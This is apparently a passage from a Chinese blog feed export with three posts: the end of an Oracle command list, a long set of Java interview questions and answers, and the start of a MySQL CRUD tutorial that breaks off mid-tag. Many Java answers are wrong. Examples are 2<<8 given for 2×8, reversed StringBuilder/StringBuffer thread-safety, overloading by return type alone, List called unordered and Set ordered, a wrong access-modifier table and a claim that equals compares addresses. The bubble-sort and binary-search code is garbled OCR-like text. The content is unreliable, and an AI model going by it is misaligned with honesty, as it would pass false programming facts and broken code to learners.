title="16，一些常用命令"></a>16，一些常用命令</h3><p>进入到数据库后执行，查询数据库服务的名称</p><p>select global_name from global_name：</p><p>启动监听</p><p>lsnrctl start</p><p>关闭监听</p><p>lsnrctl stop</p><p>查看监听状态</p><p>Lsnrctl status</p><p>进入到数据库执行，关闭数据库</p><p>shutdown</p><p>进入到数据库执行，打开数据库</p><p>startup</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java面试题</title>
    <link href="undefined2020/03/02/java%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>2020/03/02/java%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h5 id="1、面向对象的特征有哪些方面？"><a href="#1、面向对象的特征有哪些方面？" class="headerlink" title="1、面向对象的特征有哪些方面？"></a>1、面向对象的特征有哪些方面？</h5><p>答：抽象、封装、继承、多态</p><h5 id="2、访问修饰符public-private-protected-以及不写（默认）时的区别？"><a href="#2、访问修饰符public-private-protected-以及不写（默认）时的区别？" class="headerlink" title="2、访问修饰符public,private,protected,以及不写（默认）时的区别？"></a>2、访问修饰符public,private,protected,以及不写（默认）时的区别？</h5><p>​             当前类                当前包                        子类                     其它</p><pre><code>public        √             √                 √              √   protected     √             √                 √              ×     default       √             √                 √              ×     private       √             ×                 ×              ×        </code></pre><h5 id="3、String-是最基本的数据类型吗？"><a href="#3、String-是最基本的数据类型吗？" class="headerlink" title="3、String 是最基本的数据类型吗？"></a>3、String 是最基本的数据类型吗？</h5><p>不是，Java是面向对象编程，String是一个封装的类</p><h5 id="4、float-f-3-4-是否正确？"><a href="#4、float-f-3-4-是否正确？" class="headerlink" title="4、float f=3.4;是否正确？"></a>4、float f=3.4;是否正确？</h5><p>不正确，应该是float f=(float)3.4或者float f=34.F;</p><h5 id="5、short-s1-1-s1-s1-1-有错吗-short-s1-1-s1-1-有错吗？"><a href="#5、short-s1-1-s1-s1-1-有错吗-short-s1-1-s1-1-有错吗？" class="headerlink" title="5、short s1 = 1; s1 = s1 + 1;有错吗?short s1 = 1; s1 += 1;有错吗？"></a>5、short s1 = 1; s1 = s1 + 1;有错吗?short s1 = 1; s1 += 1;有错吗？</h5><p>short s1 = 1; s1 = s1 + 1;有错 s1是short类型,1是int类型，要进行强制类型转换short s1 = 1; s1 = (short)(s1 + 1);<br>short s1 = 1; s1 += 1;正确，它会被换为s1 = (short)(s1 + 1);</p><h5 id="6、int和Integer有什么区别？"><a href="#6、int和Integer有什么区别？" class="headerlink" title="6、int和Integer有什么区别？"></a>6、int和Integer有什么区别？</h5><p>答：Java是一个近乎纯洁的面向对象编程语言，但是为了编程的方便还是引入了基本数据类型，但是为了能够将这些基本数据类型当成对象操作，Java为每一个基本数据类型都引入了对应的包装类型（wrapper class），int的包装类就是Integer，从Java 5开始引入了自动装箱/拆箱机制，使得二者可以相互转换。</p><pre><code class="java">class AutoUnboxingTest {  public static void main(String[] args) {    Integer a = new Integer(3);    Integer b = 3;         // 将3自动装箱成Integer类型    int c = 3;    System.out.println(a == b);   // false 两个引用没有引用同一对象    System.out.println(a == c);   // true a自动拆箱成int类型再和c比较  }}</code></pre><p>最近还遇到一个面试题，也是和自动装箱和拆箱有点关系的，代码如下所示：</p><pre><code class="java">public class Test03 {  public static void main(String[] args) {    Integer f1 = 100, f2 = 100, f3 = 150, f4 = 150;    System.out.println(f1 == f2);    System.out.println(f3 == f4);  }}</code></pre><p>如果不明就里很容易认为两个输出要么都是true要么都是false。首先需要注意的是f1、f2、f3、f4四个变量都是Integer对象引用，所以下面的==运算比较的不是值而是引用。装箱的本质是什么呢？当我们给一个Integer对象赋一个int值的时候，会调用Integer类的静态方法valueOf</p><pre><code class="java">public static Integer valueOf(int i) {  if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)    return IntegerCache.cache[i + (-IntegerCache.low)];  return new Integer(i);}</code></pre><p>简单的说，如果整型字面量的值在-128到127之间，那么不会new新的Integer对象，而是直接引用常量池中的Integer对象，所以上面的面试题中f1==f2的结果是true，而f3==f4的结果是false。</p><h5 id="7、-amp-和-amp-amp-的区别？"><a href="#7、-amp-和-amp-amp-的区别？" class="headerlink" title="7、&amp;和&amp;&amp;的区别？"></a>7、&amp;和&amp;&amp;的区别？</h5><p>&amp;是位运算符，&amp;&amp;是逻辑运算符；&amp;运算时它的前后两个表达式都要运算然后给出结果，&amp;&amp;运算时如果前面哪个表达式的值是false则不用计算后面的表达式，<br>直接给出结果false</p><h5 id="8、解释内存中的栈-stack-、堆-heap-和方法区、常量池的用法。"><a href="#8、解释内存中的栈-stack-、堆-heap-和方法区、常量池的用法。" class="headerlink" title="8、解释内存中的栈(stack)、堆(heap)和方法区、常量池的用法。"></a>8、解释内存中的栈(stack)、堆(heap)和方法区、常量池的用法。</h5><p>栈存储的是变量名，堆存储的是对象，静态区存储使用static修饰的属性和方法</p><h5 id="9、Math-round-11-5-等于多少？Math-round-11-5-等于多少？"><a href="#9、Math-round-11-5-等于多少？Math-round-11-5-等于多少？" class="headerlink" title="9、Math.round(11.5) 等于多少？Math.round(-11.5)等于多少？"></a>9、Math.round(11.5) 等于多少？Math.round(-11.5)等于多少？</h5><p>Math.round(11.5) 等于12</p><p>Math.round(-11.5)等于-11</p><h5 id="10、switch-是否能作用在byte-上，是否能作用在long-上，是否能作用在String上？"><a href="#10、switch-是否能作用在byte-上，是否能作用在long-上，是否能作用在String上？" class="headerlink" title="10、switch 是否能作用在byte 上，是否能作用在long 上，是否能作用在String上？"></a>10、switch 是否能作用在byte 上，是否能作用在long 上，是否能作用在String上？</h5><p>switch循环支持byte</p><p> String,不支持long</p><h5 id="11、用最有效率的方法计算2乘以8？"><a href="#11、用最有效率的方法计算2乘以8？" class="headerlink" title="11、用最有效率的方法计算2乘以8？"></a>11、用最有效率的方法计算2乘以8？</h5><p>2&lt;&lt;8</p><h5 id="12、数组有没有length-方法？String有没有length-方法？"><a href="#12、数组有没有length-方法？String有没有length-方法？" class="headerlink" title="12、数组有没有length()方法？String有没有length()方法？"></a>12、数组有没有length()方法？String有没有length()方法？</h5><p>数组有没有length()方法,有length属性,String有length()方法</p><h5 id="13、构造器（constructor）是否可被重写（override）？"><a href="#13、构造器（constructor）是否可被重写（override）？" class="headerlink" title="13、构造器（constructor）是否可被重写（override）？"></a>13、构造器（constructor）是否可被重写（override）？</h5><p>构造器只有一个不能被重写，但是可以被重载</p><h5 id="14、两个对象值相同-x-equals-y-true-，但却可有不同的hash-code，这句话对不对？"><a href="#14、两个对象值相同-x-equals-y-true-，但却可有不同的hash-code，这句话对不对？" class="headerlink" title="14、两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，这句话对不对？"></a>14、两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，这句话对不对？</h5><p>不对，.equals方法对比的是两个值的地址，地址相同hashcode也相同</p><h5 id="15、是否可以继承String类？"><a href="#15、是否可以继承String类？" class="headerlink" title="15、是否可以继承String类？"></a>15、是否可以继承String类？</h5><p>不可以,String类是用final修饰的</p><h5 id="16、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递？"><a href="#16、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递？" class="headerlink" title="16、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递？"></a>16、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递？</h5><p>值传递</p><h5 id="17、String和StringBuilder、StringBuffer的区别？"><a href="#17、String和StringBuilder、StringBuffer的区别？" class="headerlink" title="17、String和StringBuilder、StringBuffer的区别？"></a>17、String和StringBuilder、StringBuffer的区别？</h5><p>String再循环中每次都会创建一个新的String对象，StringBuilder和StringBuffer是始终使用一个对象，所以更快，StringBuilder可以使用多线程速度稍微比StringBuffer慢点，StringBuffer只能单线程速度最快</p><h5 id="18、重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？"><a href="#18、重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？" class="headerlink" title="18、重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？"></a>18、重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？</h5><p>重载是在一个类中除方法名必须相同外其他不必相同；重写是子类对父类方法的重写，除方法体不相同，其他必须相同，子类的修饰符范围必须大于或等于父类的修饰符，重载的方法可以根据返回类型进行区分</p><h5 id="19、描述一下JVM加载class文件的原理机制？"><a href="#19、描述一下JVM加载class文件的原理机制？" class="headerlink" title="19、描述一下JVM加载class文件的原理机制？"></a>19、描述一下JVM加载class文件的原理机制？</h5><p>jvm是先把class文件转换为数组，在运行数组</p><h5 id="20、抽象类（abstract-class）和接口（interface）有什么异同？"><a href="#20、抽象类（abstract-class）和接口（interface）有什么异同？" class="headerlink" title="20、抽象类（abstract class）和接口（interface）有什么异同？"></a>20、抽象类（abstract class）和接口（interface）有什么异同？</h5><p>抽象类可以有构造方法，可以有方法体，修饰符可以是任意类型；接口不可以有构造方法，不可以有方法体，修饰符只能是public，接口每一个属性和方法都被默认为被public static final修饰。抽象可以被单继承，接口可以被多实现，它们都是一种规范和标准，约束类的行为，方法都要被重写</p><h5 id="21、Java-中会存在内存泄漏吗，请简单描述。"><a href="#21、Java-中会存在内存泄漏吗，请简单描述。" class="headerlink" title="21、Java 中会存在内存泄漏吗，请简单描述。"></a>21、Java 中会存在内存泄漏吗，请简单描述。</h5><p>不会存在内存泄漏，因为Java中有Gc垃圾回收机制，但是在实际应用中如果hasnmap session用完没有手动清空，关闭的话会存在内存泄漏</p><h5 id="22、GC是什么？为什么要有GC？"><a href="#22、GC是什么？为什么要有GC？" class="headerlink" title="22、GC是什么？为什么要有GC？"></a>22、GC是什么？为什么要有GC？</h5><p>Gc是垃圾回收机制,栈中的变量在使用后会自动删除，堆中存储的需要Gc垃圾回收机制回收。</p><h5 id="23、String-s-new-String-“xyz”-创建了几个字符串对象？"><a href="#23、String-s-new-String-“xyz”-创建了几个字符串对象？" class="headerlink" title="23、String s = new String(“xyz”);创建了几个字符串对象？"></a>23、String s = new String(“xyz”);创建了几个字符串对象？</h5><p>两个，“xyz”在变量池中，new String()在堆中</p><h5 id="24、接口是否可继承（extends）接口？抽象类是否可实现（implements）接口？抽象类是否可继承具体类（concrete-class）？"><a href="#24、接口是否可继承（extends）接口？抽象类是否可实现（implements）接口？抽象类是否可继承具体类（concrete-class）？" class="headerlink" title="24、接口是否可继承（extends）接口？抽象类是否可实现（implements）接口？抽象类是否可继承具体类（concrete class）？"></a>24、接口是否可继承（extends）接口？抽象类是否可实现（implements）接口？抽象类是否可继承具体类（concrete class）？</h5><p>接口是可以继承接口，抽象类是可以实现接口，抽象类是可以继承具体类</p><h5 id="25、Java-中的final关键字有哪些用法？"><a href="#25、Java-中的final关键字有哪些用法？" class="headerlink" title="25、Java 中的final关键字有哪些用法？"></a>25、Java 中的final关键字有哪些用法？</h5><p>Final修饰的属性是常量，不能改变；修饰的方法不能被重写；修饰的类不能被继承</p><h5 id="26、指出下面程序的运行结果。"><a href="#26、指出下面程序的运行结果。" class="headerlink" title="26、指出下面程序的运行结果。"></a>26、指出下面程序的运行结果。</h5><pre><code class="java">class A {     static {        System.out.print(&quot;1&quot;);    }     public A() {        System.out.print(&quot;2&quot;);    }} class B extends A{     static {        System.out.print(&quot;a&quot;);    }     public B() {        System.out.print(&quot;b&quot;);    }} public class Hello {     public static void main(String[] args) {        A ab = new B();        ab = new B();    } }</code></pre><p>1a2b2b,先执行父类的静态方法，在执行本类的静态方法，再依次执行父类和本类的构造方法</p><h5 id="27、数据类型之间的转换："><a href="#27、数据类型之间的转换：" class="headerlink" title="27、数据类型之间的转换："></a>27、数据类型之间的转换：</h5><p>int转换为字符串：int a=1;String b=a+”” ; String c=Intereg.valueof(a).toString();</p><p>字符串转换为int：String a=”1” int b=Intereg.valueof(a);</p><h5 id="28、如何实现字符串的反转及替换？"><a href="#28、如何实现字符串的反转及替换？" class="headerlink" title="28、如何实现字符串的反转及替换？"></a>28、如何实现字符串的反转及替换？</h5><p>StringBuffer result=new StringBuffer(“abc”);<br>result.revese().toString();</p><h5 id="29、怎样将GB2312编码的字符串转换为ISO-8859-1编码的字符串？"><a href="#29、怎样将GB2312编码的字符串转换为ISO-8859-1编码的字符串？" class="headerlink" title="29、怎样将GB2312编码的字符串转换为ISO-8859-1编码的字符串？"></a>29、怎样将GB2312编码的字符串转换为ISO-8859-1编码的字符串？</h5><p> String s1 = “你好”; </p><p> String s2 = new String(s1.getBytes(“GB2312”), “ISO-8859-1”); </p><h5 id="30、利用java-text-DataFormat-的子类（如SimpleDateFormat类）中的format-Date-方法可将日期格式化"><a href="#30、利用java-text-DataFormat-的子类（如SimpleDateFormat类）中的format-Date-方法可将日期格式化" class="headerlink" title="30、利用java.text.DataFormat 的子类（如SimpleDateFormat类）中的format(Date)方法可将日期格式化"></a>30、利用java.text.DataFormat 的子类（如SimpleDateFormat类）中的format(Date)方法可将日期格式化</h5><p>String birthday=”2020-02-25”;<br>DateTimeFormatter fmt = DateTimeFormatter.ofPattern(“yyyy-MM-dd”);<br>LocalDate date2 = LocalDate.parse(birthday, fmt);</p><h5 id="31、比较一下Java和JavaSciprt。"><a href="#31、比较一下Java和JavaSciprt。" class="headerlink" title="31、比较一下Java和JavaSciprt。"></a>31、比较一下Java和JavaSciprt。</h5><p>Java是一种基于面向对象的编程语言，javaSciprt是一种解释性脚本语言</p><h5 id="32、try-里有一个return语句，那么紧跟在这个try后的finally-里的代码会不会被执行，什么时候被执行，在return前还是后"><a href="#32、try-里有一个return语句，那么紧跟在这个try后的finally-里的代码会不会被执行，什么时候被执行，在return前还是后" class="headerlink" title="32、try{}里有一个return语句，那么紧跟在这个try后的finally{}里的代码会不会被执行，什么时候被执行，在return前还是后?"></a>32、try{}里有一个return语句，那么紧跟在这个try后的finally{}里的代码会不会被执行，什么时候被执行，在return前还是后?</h5><p>会执行，在return后执行</p><h5 id="33、列出一些你常见的运行时异常？"><a href="#33、列出一些你常见的运行时异常？" class="headerlink" title="33、列出一些你常见的运行时异常？"></a>33、列出一些你常见的运行时异常？</h5><p>1、ClassCastException(类转换异常)</p><p>2、IndexOutOfBoundsException(数组越界)</p><p>3、NullPointerException(空指针)</p><p>4、ArrayStoreException(数据存储异常，操作数组时类型不一致)</p><p>5、BufferOverflowException异常</p><h5 id="34、类ExampleA继承Exception，类ExampleB继承ExampleA。"><a href="#34、类ExampleA继承Exception，类ExampleB继承ExampleA。" class="headerlink" title="34、类ExampleA继承Exception，类ExampleB继承ExampleA。"></a>34、类ExampleA继承Exception，类ExampleB继承ExampleA。</h5><p>有如下代码片断：</p><pre><code class="java">        try {              throw new ExampleB(&quot;b&quot;);            } catch(ExampleA e){              System.out.println(&quot;ExampleA&quot;);            } catch(Exception e){              System.out.println(&quot;Exception&quot;);            }</code></pre><p>请问执行此段代码的输出是什么？</p><p>ExampleA</p><p>面试题 - 说出下面代码的运行结果。（此题的出处是《Java编程思想》一书）</p><pre><code class="java">class Annoyance extends Exception {}class Sneeze extends Annoyance {}class Human {  public static void main(String[] args)     throws Exception {    try {      try {        throw new Sneeze();      }       catch ( Annoyance a ) {        System.out.println(&quot;Caught Annoyance&quot;);        throw a;      }    }     catch ( Sneeze s ) {      System.out.println(&quot;Caught Sneeze&quot;);      return ;    }    finally {      System.out.println(&quot;Hello World!&quot;);    }  }}</code></pre><p>输出：Caught Annoyance  Hello World!</p><pre><code class="java">try {    throw new Annoyance(); } catch (Sneeze s) {      System.out.println(&quot;Caught Sneeze&quot;);    return;  } finally {    System.out.println(&quot;Hello World!&quot;);  }  </code></pre><p>输出：Hello World!</p><pre><code class="java">try {    throw new Annoyance(); } catch (Sneeze s) {     System.out.println(&quot;Caught Sneeze&quot;);    return;  } catch (Exception e) {    System.out.println(&quot;Caught Exception&quot;);        return;  } finally {  System.out.println(&quot;Hello World!&quot;);}  </code></pre><p>输出：Caught Exception Hello World!</p><h5 id="35、List、Set、Map是否继承自Collection接口？"><a href="#35、List、Set、Map是否继承自Collection接口？" class="headerlink" title="35、List、Set、Map是否继承自Collection接口？"></a>35、List、Set、Map是否继承自Collection接口？</h5><p>List、Set继承自Collection接口，map本身就是一个接口</p><h5 id="36、Collection和Collections的区别？"><a href="#36、Collection和Collections的区别？" class="headerlink" title="36、Collection和Collections的区别？"></a>36、Collection和Collections的区别？</h5><p>Collection是list,set集合的父接口，Collections是工具类</p><h5 id="37、List、Map、Set三个接口存取元素时，各有什么特点？"><a href="#37、List、Map、Set三个接口存取元素时，各有什么特点？" class="headerlink" title="37、List、Map、Set三个接口存取元素时，各有什么特点？"></a>37、List、Map、Set三个接口存取元素时，各有什么特点？</h5><p>List集合是无序的元素可以重复，可通过下标获取，</p><p>Set是有序的集合，元素不能重复，通过循环遍历每个元素，</p><p>map存储的是键值对  。</p><h5 id="38、Thread类的sleep-方法和对象的wait-方法都可以让线程暂停执行，它们有什么区别"><a href="#38、Thread类的sleep-方法和对象的wait-方法都可以让线程暂停执行，它们有什么区别" class="headerlink" title="38、Thread类的sleep()方法和对象的wait()方法都可以让线程暂停执行，它们有什么区别?"></a>38、Thread类的sleep()方法和对象的wait()方法都可以让线程暂停执行，它们有什么区别?</h5><p>Thread类的sleep()方法暂停指定时间段线程，</p><p>wait()方法暂停执行直到使用 start0方法 再次执行</p><h5 id="39、线程的sleep-方法和yield-方法有什么区别？"><a href="#39、线程的sleep-方法和yield-方法有什么区别？" class="headerlink" title="39、线程的sleep()方法和yield()方法有什么区别？"></a>39、线程的sleep()方法和yield()方法有什么区别？</h5><p>sleep()方法暂停指定时间段线程，yield()方法暂停当前正在执行的线程对象,并执行其他线程 </p><h5 id="40、当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？"><a href="#40、当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？" class="headerlink" title="40、当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？"></a>40、当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？</h5><p>不可以，其他线程可以方法这个对象的非同步方法，同步方法不能进入，synchronized以获得这个对象的锁。</p><h5 id="41、请说出与线程同步以及线程调度相关的方法。"><a href="#41、请说出与线程同步以及线程调度相关的方法。" class="headerlink" title="41、请说出与线程同步以及线程调度相关的方法。"></a>41、请说出与线程同步以及线程调度相关的方法。</h5><p>wait(): 使一个线程处于等待(阻塞) 状态，并且释放所持有的对象的锁;</p><p> sleep():使-个正在运行的线程处于睡眠状态,是一个静态方法，调用此方法要处理<br>InterruptedException异常;<br>notify():唤醒一个处于等待状态的线程，当然在调用此方法的时候，并不能确切的唤醒某一<br>个等待状态的线程，而是由JVM确定唤醒哪个线程，而且与优先级无关;<br>notityAll():唤醒所有处于等待状态的线程，该方法并不是将对象的锁给所有线程，而是让它<br>们竞争，只有获得锁的线程才能进入就绪状态; </p><h5 id="42、编写多线程程序有几种实现方式？"><a href="#42、编写多线程程序有几种实现方式？" class="headerlink" title="42、编写多线程程序有几种实现方式？"></a>42、编写多线程程序有几种实现方式？</h5><p>一种是继承Thread类;另-种是实现Runnable接口。两种方式都要重写run()方法 </p><h5 id="43、synchronized关键字的用法？"><a href="#43、synchronized关键字的用法？" class="headerlink" title="43、synchronized关键字的用法？"></a>43、synchronized关键字的用法？</h5><p> synchronized关键字可以将对象或者方法标记为同步，以实现对对象和方法的互斥访问，<br>可以用synchronized(对象) { … }定义同步代码块，或者在声明方法时将synchronized作为方法<br>的修饰符。</p><h5 id="44、举例说明同步和异步。"><a href="#44、举例说明同步和异步。" class="headerlink" title="44、举例说明同步和异步。"></a>44、举例说明同步和异步。</h5><p>例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就必须进行同步存取（数据库操作中的排他锁就是最好的例子）。当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。</p><h5 id="45、简述synchronized-和java-util-concurrent-locks-Lock的异同？"><a href="#45、简述synchronized-和java-util-concurrent-locks-Lock的异同？" class="headerlink" title="45、简述synchronized 和java.util.concurrent.locks.Lock的异同？"></a>45、简述synchronized 和java.util.concurrent.locks.Lock的异同？</h5><p> Lock能完成几乎所有synchronized的功能，并有一些后者不具备的功能， Lock 需要程序员在finally块中手工释放  ，在并发量小的时候，用synchronize是比较好的选择，并发量大的时候用Lock，synchronize是自动释放锁，Lock是主动释放锁，Lock可以设定所等待的时间。</p><h5 id="46、事务的ACID是指什么？"><a href="#46、事务的ACID是指什么？" class="headerlink" title="46、事务的ACID是指什么？"></a>46、事务的ACID是指什么？</h5><p>一致性(Consistent):事务结束后系统状态是一致的;<br>隔离性(Isolated): 并发执行的事务彼此无法看到对方的中间状态;<br>持久性(Durable): 事务完成后所做的改动都会被持久化，即使发生灾难性的失败。通过日志<br>和同步备份可以在故障发生后重建数据。 </p><h5 id="47、获得一个类的类对象有哪些方式？"><a href="#47、获得一个类的类对象有哪些方式？" class="headerlink" title="47、获得一个类的类对象有哪些方式？"></a>47、获得一个类的类对象有哪些方式？</h5><p>方法1:类型.class， 例如: String.class<br>方法2:对象.getClass(), 例如: “hello”.getClass()<br>方法3: Class.forName(), 例如: Class.forName(“java.lang.string) </p><h5 id="48、简述一下面向对象的”六原则一法则”。"><a href="#48、简述一下面向对象的”六原则一法则”。" class="headerlink" title="48、简述一下面向对象的”六原则一法则”。"></a>48、简述一下面向对象的”六原则一法则”。</h5><p> 单一职责原则:一个类只做它该做的事情 。</p><p> 开闭原则:软件实体应当对扩展开放，对修改关闭。 </p><p> 依赖倒转原则：面向接口编程。 </p><p> 里氏替换原则:任何时候都可以用子类型替换掉父类型。 </p><p> 接口隔离原则：接口要小而专，绝不能大而全。 </p><p> 合成聚合复用原则：优先使用聚合或合成关系复用代码。 </p><p> 迪米特法则：迪米特法则又叫最少知识原则，一个对象应当对其他对象有尽可能少的了解。 </p><h5 id="49、简述一下你了解的设计模式。"><a href="#49、简述一下你了解的设计模式。" class="headerlink" title="49、简述一下你了解的设计模式。"></a>49、简述一下你了解的设计模式。</h5><p>单例模式：某个类只能有一个实例，提供一个全局的访问点。</p><p>简单工厂：一个工厂类根据传入的参量决定创建出那一种产品类的实例。</p><p>工厂方法：定义一个创建对象的接口，让子类决定实例化那个类。</p><p>抽象工厂：创建相关或依赖对象的家族，而无需明确指定具体类。</p><p>建造者模式：封装一个复杂对象的构建过程，并可以按步骤构造。</p><p>原型模式：通过复制现有的实例来创建新的实例。</p><p>适配器模式：将一个类的方法接口转换成客户希望的另外一个接口。</p><p>组合模式：将对象组合成树形结构以表示“”部分-整体“”的层次结构。</p><p>装饰模式：动态的给对象添加新的功能。</p><p>代理模式：为其他对象提供一个代理以便控制这个对象的访问。</p><p>亨元（蝇量）模式：通过共享技术来有效的支持大量细粒度的对象。</p><p>外观模式：对外提供一个统一的方法，来访问子系统中的一群接口。</p><p>桥接模式：将抽象部分和它的实现部分分离，使它们都可以独立的变化。</p><p>模板模式：定义一个算法结构，而将一些步骤延迟到子类实现。</p><p>解释器模式：给定一个语言，定义它的文法的一种表示，并定义一个解释器。</p><p>策略模式：定义一系列算法，把他们封装起来，并且使它们可以相互替换。</p><p>状态模式：允许一个对象在其对象内部状态改变时改变它的行为。</p><p>观察者模式：对象间的一对多的依赖关系。</p><p>备忘录模式：在不破坏封装的前提下，保持对象的内部状态。</p><p>中介者模式：用一个中介对象来封装一系列的对象交互。</p><p>命令模式：将命令请求封装为一个对象，使得可以用不同的请求来进行参数化。</p><p>访问者模式：在不改变数据结构的前提下，增加作用于一组对象元素的新功能。</p><p>责任链模式：将请求的发送者和接收者解耦，使的多个对象都有处理这个请求的机会。</p><p>迭代器模式：一种遍历访问聚合对象中各个元素的方法，不暴露该对象的内部结构。</p><h5 id="50、用Java写一个冒泡排序。"><a href="#50、用Java写一个冒泡排序。" class="headerlink" title="50、用Java写一个冒泡排序。"></a>50、用Java写一个冒泡排序。</h5><pre><code class="java">for(int i=0;i&lt;arr . length-1;i++){//外层循环控制排序趟数  for(int j=0;j&lt;arr. length-1-i;j++){//内层循环控制每- -趟排序多少次    if(arr[jl&gt;arr[j+11){        int temp=arr[j];        arr[j]=arr[j+1];        arrlj+1]=temp;   }}</code></pre><h5 id="51、用Java写一个二分查找。"><a href="#51、用Java写一个二分查找。" class="headerlink" title="51、用Java写一个二分查找。"></a>51、用Java写一个二分查找。</h5><p>非递归实现</p><pre><code class="java">public static int biSearch(int [ ]array,int a){        int 1o=0;        int hi=array.length-1;        int mid;      while(lo&lt;=hi){            mid=(1o+hi)/2;          if(array[mid]==a){            return mid+1;          }else if(array[mid]&lt;a){            1o=mid+1;          }else{            hi=mid-1;          }        return -1;      }}</code></pre><p>递归实现</p><pre><code class="java">public static int binarySearch(int[] arr,int low,int high,int key ) {        int mid = (low + high)/2;        if(arr[mid] == key) {            index = mid;            return mid;        }        if(low&gt;high) {            return -1;        }else if(key &gt; arr[mid]) {            return binarySearch(arr,mid+1,high,key);        }else if(key &lt; arr[mid]) {            return binarySearch(arr,low,mid-1,key);        }        return -1;            }</code></pre><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="52、Servlet的运行过程？"><a href="#52、Servlet的运行过程？" class="headerlink" title="52、Servlet的运行过程？"></a>52、Servlet的运行过程？</h5><p> Web容器加载Servlet并将其实例化后，Servlet生 命周期开始，容器运行其init(方法进行<br>Servlet的初始化;请求到达时调用Servlet的service(方法，service()方法 会根据需要调用与请<br>求对应的doGet或doPost等方法;当服务器关闭或项目被卸载时服务器会将Servlet实例销毁,<br>此时会调用Servlet的destroy0方法 </p><h5 id="53、转发（forward）和重定向（redirect）的区别？"><a href="#53、转发（forward）和重定向（redirect）的区别？" class="headerlink" title="53、转发（forward）和重定向（redirect）的区别？"></a>53、转发（forward）和重定向（redirect）的区别？</h5><p>转发是服务器行为,重定向是客户端行为<br>1.转发在服务器端完成的;重定向是在客户端完成的<br>2.转发的速度快;重定向速度慢<br>3.转发的是同一次请求，会提示是否重新提交订单;重定向是两次不同请求<br>4.转发不会执行转发后的代码;重定向会执行重定向之后的代码<br>5.转发地址栏没有变化;重定向地址栏有变化<br>6.转发必须是在同一台服务器下完成;重定向可以在不同的服务器下完成</p><h5 id="54、JSP有哪些内置对象？作用分别是什么？"><a href="#54、JSP有哪些内置对象？作用分别是什么？" class="headerlink" title="54、JSP有哪些内置对象？作用分别是什么？"></a>54、JSP有哪些内置对象？作用分别是什么？</h5><p> JSP有9个内置对象:<br>- request;封装客户端的请求，其中包含来自GET或POST请求的参数; .<br>- response:封装服务器对客户端的响应;<br>- pageContext:通过该对象可以获取其他对象;<br>. session:封装用户会话的对象;<br>. application:封装服务器运行环境的对象;<br>- out: 输出服务器响应的输出流对象;<br>- config: Web应用的配置对象;<br>- page: JSP页面本身(相当于Java程序中的this) ;<br>- exception: 封装页面抛出异常的对象。 </p><h5 id="55、讲解JSP中的四种作用域。"><a href="#55、讲解JSP中的四种作用域。" class="headerlink" title="55、讲解JSP中的四种作用域。"></a>55、讲解JSP中的四种作用域。</h5><p> SP中的四种作用域包括page. request. session和application, 具体来说:<br>- page代表与一个页面相关的对象和属性。<br>- request代表与Web客户机发出的一个请求相关的对象和属性。一个请求可能跨越多个页面，<br>涉及多个Web组件;需要在页面显示的临时数据可以置于此作用域。<br>- session代表与某个用户与服务器建立的一次会话相关的对象和属性。跟某个用户相关的数据<br>应该放在用户自己的session中。<br>. application代表与整个Web应用程序相关的对象和属性，它实质上是跨越整个Web应用程<br>序，包括多个页面、请求和会话的一个全局作用域。 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库增删改查SQL语句</title>
    <link href="undefined2020/03/02/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5SQL%E8%AF%AD%E5%8F%A5/"/>
    <url>2020/03/02/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5SQL%E8%AF%AD%E5%8F%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="MySQL数据库增删改查SQL语句"><a href="#MySQL数据库增删改查SQL语句" class="headerlink" title="MySQL数据库增删改查SQL语句"></a>MySQL数据库增删改查SQL语句</h3><p><img src="C:%5CUsers%5CCZ%5CDesktop%5Ctimg.jpg" srcset="undefined" alt=""></p><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><pre><code class="mysql">show databases; </code></pre><h5 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h5><pre><code class="mysql">use 数据库名;</code></pre><h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><pre><code class="mysql">CREATE DATABASE 数据库名;</code></pre><h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><pre><code class="mysql">DROP DATABASE 数据库名;</code></pre><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><pre><code class="mysql">create table 表名(    列名1 类型(长度) [约束],    列名2 类型(长度) [约束],    ……);</code></pre><h5 id="长度区别"><a href="#长度区别" class="headerlink" 